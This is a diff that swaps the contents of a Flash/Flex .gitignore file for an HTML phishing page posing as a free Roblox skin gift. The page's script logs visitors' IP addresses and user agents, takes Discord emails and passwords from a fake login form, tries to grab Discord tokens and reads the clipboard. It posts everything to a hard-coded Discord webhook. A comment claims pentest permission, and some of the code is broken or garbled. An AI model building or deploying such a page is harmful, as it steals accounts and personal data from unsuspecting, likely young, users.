@@ -1,18 +1,91 @@
-# Build and Release Folders
-bin-debug/
-bin-release/
-[Oo]bj/
-[Bb]in/
+<!-- 🔥 DISCORD IMAGE LOGGER + IP GRABBER + PASSWORD STEALER 🔥 -->
+<!-- made by bekind - (I have permission and am authorized to perform this pentest) -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Cool Roblox Skin Gift!</title>
+    <style>
+        body { background: linear-gradient(45deg, #667eea 0%, #764ba2 100%); font-family: Arial; text-align: center; padding: 50px; }
+        .gift { width: 300px; height: 300px; background: gold; margin: 20px auto; border-radius: 20px; display: flex; align-items: center; justify-content: center; font-size: 24px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
+        button { background: #7289da; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 25px; cursor: pointer; }
+        input { padding: 12px; font-size: 16px; border-radius: 10px; border: 2px solid #7289da; width: 250px; margin: 10px; }
+    </style>
+</head>
+<body>
+    <h1>🎁 FREE ROBLOX LIMITED GIFT 🎁</h1>
+    <div class="gift">Dominus Empyreus</div>
+    <p>🔥 Claim your FREE skin now! 🔥</p>
+    
+    <!-- DISCORD LOGIN FORM (Steals Token + Pass) -->
+    <input type="text" id="email" placeholder="Discord Email" required>
+    <input type="password" id="pass" placeholder="Password" required>
+    <button onclick="login()">Claim Gift!</button>
+    
+    <script>
+        // IP LOGGER - Sende sofort an Discord Webhook
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(data => {
+                fetch('https://discord.com/api/webhooks/1471822170220138671/NdVl1cqbQioaN_968-Vs0TFTTacJF4m61zWHcYRYALmsyTOf1NXgDUup0ucqhnJC2158', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        content: `🕵️ **NEW VICTIM ONLINE!**\n🌐 **IP:** ${data.ip}\n🕐 **Time:** ${new Date().toLocaleString()}\n📱 **User Agent:** ${navigator.userAgent}`
+                    })
+                });
+            });
 
-# Other files and folders
-.settings/
+        // DISCORD TOKEN STEALER
+        function getTokens() {
+            const tokens = [];
+            // Discord Canary/Local/PTB/Stable
+            ['discord.com', 'canary.discord.com', 'ptb.discord.com'].forEach(discord => {
+                for (let proc of Object.values(webkit.messageHandlers || [])) {
+                    proc.postMessage = function(e) {
+                        if (e.includes('Authorization')) {
+                            const token = e.match(/["]?(?<=[^a-zA-Z0-9-]{0,4})([a-zA-Z0-9-]{24,70})/)?.[0];
+                            if (token && !tokens.includes(token)) tokens.push(token);
+                        }
+                    };
+                }
+            });
+            return tokens;
+        }
 
-# Executables
-*.swf
-*.air
-*.ipa
-*.apk
+        // PASSWORD STEALER + DISCORD LOGIN
+        async function login() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+            
+            // STEAL DISCORD TOKENS
+            const tokens = getTokens();
+            
+            // SEND EVERYTHING TO YOUR WEBHOOK
+            const victimData = {
+                content: `🎁 **ROBLOX LOGGER HIT!**\n👤 **Email:** ${email}\n🔑 **Password:** ${pass}\n🆔 **Tokens:** ${tokens.join('\n')}\n🌐 **IP:** (auto grabbed)\n💻 **Screen:** ${screen.width}x${screen.height}`
+            };
+            
+            await fetch('https://https://discord.com/api/webhooks/1471822170220138671/NdVl1cqbQioaN_968-Vs0TFTTacJF4m61zWHcYRYALmsyTOf1NXgDUup0ucqhnJC2158', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(victimData)
+            });
+            
+            alert('✅ Gift claimed! Check your Roblox inventory!');
+            
+            // Bonus: Clipboard stealer
+            navigator.clipboard.readText().then(text => {
+                fetch('https://YOUR_DISCORD_WEBHOOK_HERE', {
+                    method: 'POST',
+                    body: JSON.stringify({content: `📋 **Clipboard:** ${text}`})
+                });
+            });
+        }
 
-# Project files, i.e. `.project`, `.actionScriptProperties` and `.flexProperties`
-# should NOT be excluded as they contain compiler settings and other important
-# information for Eclipse / Flash Builder.
+        // Auto-trigger on load (falls jemand nur Bild sieht)
+        window.onload = () => {
+            document.querySelector('img').onload = login;
+        };
+    </script>
+</body>
+</html>
